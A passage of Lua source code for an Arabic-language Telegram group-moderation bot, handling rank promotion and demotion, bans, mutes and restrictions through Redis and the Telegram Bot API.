if da.status_.ID == "ChatMemberStatusCreator" then

function FunctionStatus(arg, result)
redis:srem(bot_id.."Hadaf:President:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم تنزيله من المنشئين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end
end,nil)
elseif text == "رفع منشئ" and tonumber(msg.reply_to_message_id_) ~= 0 and PresidentGroup(msg) then
 
function FunctionStatus(arg, result)
redis:sadd(bot_id.."Hadaf:Constructor:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم ترقيته منشئ في المجموعه")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
elseif text and text:match("^تنزيل منشئ$") and tonumber(msg.reply_to_message_id_) ~= 0 and PresidentGroup(msg) then

function FunctionStatus(arg, result)
redis:srem(bot_id.."Hadaf:Constructor:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم تنزيله من المنشئين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
elseif text == ("رفع مدير") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructor(msg) then
 
function FunctionStatus(arg, result)
redis:sadd(bot_id.."Hadaf:Manager:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم ترقيته مدير المجموعه")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
elseif text == ("تنزيل مدير") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructor(msg) then
 
function FunctionStatus(arg, result)
redis:srem(bot_id.."Hadaf:Manager:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم تنزيله من المدراء")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
elseif text == ("رفع ادمن") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then
 
if not Constructor(msg) and redis:get(bot_id.."Hadaf:Cheking:Seted"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'✖┇لا تستطيع رفع احد وذلك لانه تم تعطيل الرفع من قبل المنشئين')
return false
end
function FunctionStatus(arg, result)
redis:sadd(bot_id.."Hadaf:Admin:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم ترقيته ادمن للمجموعه")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
elseif text == ("تنزيل ادمن") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then
 
function FunctionStatus(arg, result)
redis:srem(bot_id.."Hadaf:Admin:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم تنزيله من ادمنيه المجموعه")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
elseif text == ("رفع مميز") and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then
 
if not Constructor(msg) and redis:get(bot_id.."Hadaf:Cheking:Seted"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'✖┇لا تستطيع رفع احد وذلك لانه تم تعطيل الرفع من قبل المنشئين')
return false
end
function FunctionStatus(arg, result)
redis:sadd(bot_id.."Hadaf:Vip:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم ترقيته مميز للمجموعه")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
elseif text == ("تنزيل مميز") and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then
 
function FunctionStatus(arg, result)
redis:srem(bot_id.."Hadaf:Vip:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم تنزيله من المميزين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
elseif text == ("حظر") and msg.reply_to_message_id_ ~= 0 and Admin(msg) then

if not Constructor(msg) and redis:get(bot_id.."Hadaf:Lock:Ban:Group"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'✅┇لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"⚠️️┇عذرًا البوت ليس ادمن") 
return false  
end
function FunctionStatus(arg, result)
if Rank_Checking(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n⚠️️┇لا تستطيع -( حظر , طرد , كتم , تقييد ) : "..Get_Rank(result.sender_user_id_,msg.chat_id_).." ")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"⚠️️┇لا توجد لدي صلاحية حظر المستخدمين") 
return false  
end
redis:sadd(bot_id.."Hadaf:Removal:User:Group"..msg.chat_id_, result.sender_user_id_)
KickGroup(result.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم حظره من المجموعه")  
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
elseif text == ("الغاء الحظر") and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then

function FunctionStatus(arg, result)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, "✅┇لا يمكنك عمل هذا الامر على البوت") 
return false 
end
redis:srem(bot_id.."Hadaf:Removal:User:Group"..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم الغاء حظره من هنا")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
elseif text == ("كتم") and msg.reply_to_message_id_ ~= 0 and Admin(msg) then

if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"⚠️┇عذرًا البوت ليس ادمن") 
return false  
end
function FunctionStatus(arg, result)
if Rank_Checking(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n⚠️┇لا تستطيع -( حظر , طرد , كتم , تقييد ) : "..Get_Rank(result.sender_user_id_,msg.chat_id_).."")
return false 
end     
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم كتمه من هنا")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
elseif text == ("الغاء الكتم") and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then

function FunctionStatus(arg, result)
redis:srem(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم الغاء كتمه من هنا")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
elseif text == ("الغاء التقييد") and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then

function FunctionStatus(arg, result)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"⚠️┇عذرًا البوت ليس ادمن") 
return false  
end
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم الغاء تقييده")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)

elseif text == ("تقييد") and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then

function FunctionStatus(arg, result)
if Rank_Checking(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n⚠️┇لا تستطيع -( حظر , طرد , كتم , تقييد ) : "..Get_Rank(result.id_,msg.chat_id_).."")
return false 
end      
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"⚠️┇عذرًا البوت ليس ادمن") 
return false  
end
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم تقييده")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
elseif text and text:match("^حظر عام @(.*)$") and Dev_Hadaf(msg) then

function FunctionStatus(arg, result)
if (result.id_) then
if result and result.type_ and result.type_.ID == ("ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠️┇عذرًا هذا معرف قناة")   
return false 
end      
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⚠️┇لا تسطيع حظر البوت عام")
return false 
end
if Dev_Hadaf_User(result.id_) == true then
send(msg.chat_id_, msg.id_, "⚠️┇لا تستطيع حظر المطور الاساسي عام")
return false 
end
redis:sadd(bot_id.."Hadaf:Removal:User:Groups", result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم حظره عام من المجموعات")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^حظر عام @(.*)$")}, FunctionStatus, nil)
elseif text and text:match("^الغاء العام @(.*)$") and Dev_Hadaf(msg) then

function FunctionStatus(arg, result)
if (result.id_) then
Send_Options(msg,result.id_,"reply","✅┇تم الغاء حظره عام من المجموعات")  
redis:srem(bot_id.."Hadaf:Removal:User:Groups", result.id_)
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^الغاء العام @(.*)$") }, FunctionStatus, nil)
elseif text and text:match("^اضف مطور @(.*)$") and Dev_Hadaf(msg) then

function FunctionStatus(arg, result)
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠️┇عذرًا هذا معرف قناة")   
return false 
end      
redis:sadd(bot_id.."Hadaf:Developer:Bot", result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم ترقيته مطور في البوت")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^اضف مطور @(.*)$")}, FunctionStatus, nil)
elseif text and text:match("^حذف مطور @(.*)$") and Dev_Hadaf(msg) then

function FunctionStatus(arg, result)
if (result.id_) then
redis:srem(bot_id.."Hadaf:Developer:Bot", result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم تنزيله من المطورين")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^حذف مطور @(.*)$")}, FunctionStatus, nil)
elseif text and text:match("^رفع منشئ اساسي @(.*)$") and DeveloperBot(msg) then
 
function FunctionStatus(arg, result)
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠️┇عذرًا هذا معرف قناة")   
return false 
end      
redis:sadd(bot_id.."Hadaf:President:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم ترقيته منشئ اساسي")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^رفع منشئ اساسي @(.*)$")}, FunctionStatus, nil)
elseif text and text:match("^تنزيل منشئ اساسي @(.*)$") and DeveloperBot(msg) then
 
function FunctionStatus(arg, result)
if (result.id_) then
redis:srem(bot_id.."Hadaf:President:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم تنزيله من المنشئين")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل منشئ اساسي @(.*)$")}, FunctionStatus, nil)
elseif text and text:match("^رفع منشئ اساسي @(.*)$") then 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then

function FunctionStatus(arg, result)
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠️┇عذرًا هذا معرف قناة")   
return false 
end      
redis:sadd(bot_id.."Hadaf:President:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم ترقيته منشئ اساسي")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^رفع منشئ اساسي @(.*)$")}, FunctionStatus, nil)
return false
end
end,nil)
elseif text and text:match("^تنزيل منشئ اساسي @(.*)$") then 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then

function FunctionStatus(arg, result)
if (result.id_) then
redis:srem(bot_id.."Hadaf:President:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم تنزيله من المنشئين")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل منشئ اساسي @(.*)$")}, FunctionStatus, nil)
return false
end
end,nil)
elseif text and text:match("^رفع منشئ @(.*)$") and PresidentGroup(msg) then
 
function FunctionStatus(arg, result)
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠️┇عذرًا هذا معرف قناة")   
return false 
end      
redis:sadd(bot_id.."Hadaf:Constructor:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم ترقيته منشئ في المجموعه")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^رفع منشئ @(.*)$")}, FunctionStatus, nil)
elseif text and text:match("^تنزيل منشئ @(.*)$") and PresidentGroup(msg) then
 
function FunctionStatus(arg, result)
if (result.id_) then
redis:srem(bot_id.."Hadaf:Constructor:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم تنزيله من المنشئين")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل منشئ @(.*)$")}, FunctionStatus, nil)
elseif text and text:match("^رفع مدير @(.*)$") and Constructor(msg) then
 
function FunctionStatus(arg, result)
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠️┇عذرًا هذا معرف قناة")   
return false 
end      
redis:sadd(bot_id.."Hadaf:Manager:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم ترقيته مدير المجموعه")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^رفع مدير @(.*)$")}, FunctionStatus, nil)
elseif text and text:match("^تنزيل مدير @(.*)$") and Constructor(msg) then
 
function FunctionStatus(arg, result)
if (result.id_) then
redis:srem(bot_id.."Hadaf:Manager:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم تنزيله من المدراء")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل مدير @(.*)$")}, FunctionStatus, nil)
elseif text and text:match("^رفع ادمن @(.*)$") and Owner(msg) then
 
if not Constructor(msg) and redis:get(bot_id.."Hadaf:Cheking:Seted"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'✖┇لا تستطيع رفع احد وذلك لانه تم تعطيل الرفع من قبل المنشئين')
return false
end
function FunctionStatus(arg, result)
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠️┇عذرًا هذا معرف قناة")   
return false 
end      
redis:sadd(bot_id.."Hadaf:Admin:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم ترقيته ادمن للمجموعه")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^رفع ادمن @(.*)$")}, FunctionStatus, nil)
elseif text and text:match("^تنزيل ادمن @(.*)$") and Owner(msg) then
 
function FunctionStatus(arg, result)
if (result.id_) then
redis:srem(bot_id.."Hadaf:Admin:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم تنزيله من ادمنيه المجموعه")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل ادمن @(.*)$") }, FunctionStatus, nil)
elseif text and text:match("^رفع مميز @(.*)$") and Admin(msg) then
 
if not Constructor(msg) and redis:get(bot_id.."Hadaf:Cheking:Seted"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'✖┇لا تستطيع رفع احد وذلك لانه تم تعطيل الرفع من قبل المنشئين')
return false
end
function FunctionStatus(arg, result)
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠️┇عذرًا هذا معرف قناة")   
return false 
end      
redis:sadd(bot_id.."Hadaf:Vip:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم ترقيته مميز للمجموعه")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^رفع مميز @(.*)$")}, FunctionStatus, nil)
elseif text and text:match("^تنزيل مميز @(.*)$") and Admin(msg) then
 
function FunctionStatus(arg, result)
if (result.id_) then
redis:srem(bot_id.."Hadaf:Vip:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم تنزيله من المميزين")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل مميز @(.*)$") }, FunctionStatus, nil)
elseif text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) then 
if redis:sismember(bot_id.."Hadaf:Validitys:Group"..msg.chat_id_,text:match("رفع (.*)")) then
function Status_reply(extra, result, success)   
local statusrt = redis:get(bot_id.."Hadaf:Add:Validity:Group:Rt"..text:match("رفع (.*)")..msg.chat_id_)
if statusrt == "مميز" and Admin(msg) then
redis:set(bot_id.."Hadaf:Add:Validity:Users"..msg.chat_id_..result.sender_user_id_,text:match("رفع (.*)")) 
redis:sadd(bot_id.."Hadaf:Vip:Group"..msg.chat_id_,result.sender_user_id_)  
elseif statusrt == "ادمن" and Owner(msg) then 
redis:set(bot_id.."Hadaf:Add:Validity:Users"..msg.chat_id_..result.sender_user_id_,text:match("رفع (.*)"))
redis:sadd(bot_id.."Hadaf:Admin:Group"..msg.chat_id_,result.sender_user_id_)  
elseif statusrt == "مدير" and Constructor(msg) then
redis:set(bot_id.."Hadaf:Add:Validity:Users"..msg.chat_id_..result.sender_user_id_,text:match("رفع (.*)"))  
redis:sadd(bot_id.."Hadaf:Manager:Group"..msg.chat_id_,result.sender_user_id_)  
elseif statusrt == "عضو" and Admin(msg) then
end
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم ترقيته : "..text:match("رفع (.*)").."")  
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, Status_reply, nil)
end
elseif text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) then 
if redis:sismember(bot_id.."Hadaf:Validitys:Group"..msg.chat_id_,text:match("تنزيل (.*)")) then
function Status_reply(extra, result, success)   
local statusrt = redis:get(bot_id.."Hadaf:Add:Validity:Group:Rt"..text:match("تنزيل (.*)")..msg.chat_id_)
if statusrt == "مميز" and Admin(msg) then
redis:srem(bot_id.."Hadaf:Vip:Group"..msg.chat_id_,result.sender_user_id_)  
redis:del(bot_id.."Hadaf:Add:Validity:Users"..msg.chat_id_..result.sender_user_id_)
elseif statusrt == "ادمن" and Owner(msg) then 
redis:srem(bot_id.."Hadaf:Admin:Group"..msg.chat_id_,result.sender_user_id_) 
redis:del(bot_id.."Hadaf:Add:Validity:Users"..msg.chat_id_..result.sender_user_id_)
elseif statusrt == "مدير" and Constructor(msg) then
redis:srem(bot_id.."Hadaf:Manager:Group"..msg.chat_id_,result.sender_user_id_)  
redis:del(bot_id.."Hadaf:Add:Validity:Users"..msg.chat_id_..result.sender_user_id_)
elseif statusrt == "عضو" and Admin(msg) then
end
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم تنزيله : "..text:match("تنزيل (.*)").."")  
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, Status_reply, nil)
end
elseif text and text:match("^رفع (.*) @(.*)") and Admin(msg) then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if redis:sismember(bot_id.."Hadaf:Validitys:Group"..msg.chat_id_,text1[2]) then
function status_username(extra, result, success)   
if (result.id_) then
local statusrt = redis:get(bot_id.."Hadaf:Add:Validity:Group:Rt"..text1[2]..msg.chat_id_)
if statusrt == "مميز" and Admin(msg) then
redis:sadd(bot_id.."Hadaf:Vip:Group"..msg.chat_id_,result.id_)  
redis:set(bot_id.."Hadaf:Add:Validity:Users"..msg.chat_id_..result.id_,text1[2])
elseif statusrt == "ادمن" and Owner(msg) then 
redis:sadd(bot_id.."Hadaf:Admin:Group"..msg.chat_id_,result.id_)  
redis:set(bot_id.."Hadaf:Add:Validity:Users"..msg.chat_id_..result.id_,text1[2])
elseif statusrt == "مدير" and Constructor(msg) then
redis:sadd(bot_id.."Hadaf:Manager:Group"..msg.chat_id_,result.id_)  
redis:set(bot_id.."Hadaf:Add:Validity:Users"..msg.chat_id_..result.id_,text1[2])
elseif statusrt == "عضو" and Admin(msg) then
end
Send_Options(msg,result.id_,"reply","✅┇تم رفعه : "..text1[2].."")
else
send(msg.chat_id_, msg.id_,"📌┇المعرف غلط")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},status_username,nil) 
end 
elseif text and text:match("^تنزيل (.*) @(.*)") and Admin(msg) then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if redis:sismember(bot_id.."Hadaf:Validitys:Group"..msg.chat_id_,text1[2]) then
function status_username(extra, result, success)   
if (result.id_) then
local statusrt = redis:get(bot_id.."Hadaf:Add:Validity:Group:Rt"..text1[2]..msg.chat_id_)
if statusrt == "مميز" and Admin(msg) then
redis:srem(bot_id.."Hadaf:Vip:Group"..msg.chat_id_,result.id_)  
redis:del(bot_id.."Hadaf:Add:Validity:Users"..msg.chat_id_..result.id_)
elseif statusrt == "ادمن" and Owner(msg) then 
redis:srem(bot_id.."Hadaf:Admin:Group"..msg.chat_id_,result.id_)  
redis:del(bot_id.."Hadaf:Add:Validity:Users"..msg.chat_id_..result.id_)
elseif statusrt == "مدير" and Constructor(msg) then 
redis:srem(bot_id.."Hadaf:Manager:Group"..msg.chat_id_,result.id_)  
redis:del(bot_id.."Hadaf:Add:Validity:Users"..msg.chat_id_..result.id_)
elseif statusrt == "عضو" and Admin(msg) then
end
Send_Options(msg,result.id_,"reply","✅┇تم تنزيله : "..text1[2].."")
else
send(msg.chat_id_, msg.id_,"📌┇المعرف غلط")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},status_username,nil) 
end  
elseif text and text:match("^حظر @(.*)$") and Admin(msg) then

if not Constructor(msg) and redis:get(bot_id.."Hadaf:Lock:Ban:Group"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'✅┇لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"⚠️┇عذرًا البوت ليس ادمن") 
return false  
end
function FunctionStatus(arg, result)
if (result.id_) then
if Rank_Checking(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n⚠️┇لا تستطيع -( حظر , طرد , كتم , تقييد ) : "..Get_Rank(result.id_,msg.chat_id_).."")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠️┇عذرًا هذا معرف قناة")   
return false 
end      
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"⚠️┇لا توجد لدي صلاحية حظر المستخدمين") 
return false  
end
redis:sadd(bot_id.."Hadaf:Removal:User:Group"..msg.chat_id_, result.id_)
KickGroup(msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم حظره من المجموعه")  
end,nil)   
end
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^حظر @(.*)$")}, FunctionStatus, nil)
elseif text and text:match("^الغاء الحظر @(.*)$") and Admin(msg) then

function FunctionStatus(arg, result)
if (result.id_) then
if tonumber(result.id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, "✅┇لا يمكنك عمل هذا الامر على البوت") 
return false 
end
redis:srem(bot_id.."Hadaf:Removal:User:Group"..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
Send_Options(msg,result.id_,"reply","✅┇تم الغاء حظره من هنا")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^الغاء الحظر @(.*)$") }, FunctionStatus, nil)
elseif text and text:match("^كتم @(.*)$") and Admin(msg) then

if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"⚠️┇عذرًا البوت ليس ادمن") 
return false  
end
function FunctionStatus(arg, result)
if (result.id_) then
if Rank_Checking(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n⚠️┇لا تستطيع -( حظر , طرد , كتم , تقييد ) : "..Get_Rank(result.id_,msg.chat_id_).." ")
return false 
end     
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠️┇عذرًا هذا معرف قناة")   
return false 
end      
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم كتمه من هنا")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^كتم @(.*)$")}, FunctionStatus, nil)
elseif text and text:match("^الغاء الكتم @(.*)$") and Admin(msg) then

function FunctionStatus(arg, result)
if (result.id_) then
redis:srem(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم الغاء كتمه من هنا")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^الغاء الكتم @(.*)$")}, FunctionStatus, nil)
elseif text and text:match("^تقييد @(.*)$") and Admin(msg) then

function FunctionStatus(arg, result)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"⚠️┇عذرًا البوت ليس ادمن") 
return false  
end
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠️┇عذرًا هذا معرف قناة")   
return false 
end      
if Rank_Checking(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n⚠️┇لا تستطيع -( حظر , طرد , كتم , تقييد ) : "..Get_Rank(result.id_,msg.chat_id_).."")
return false 
end      
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
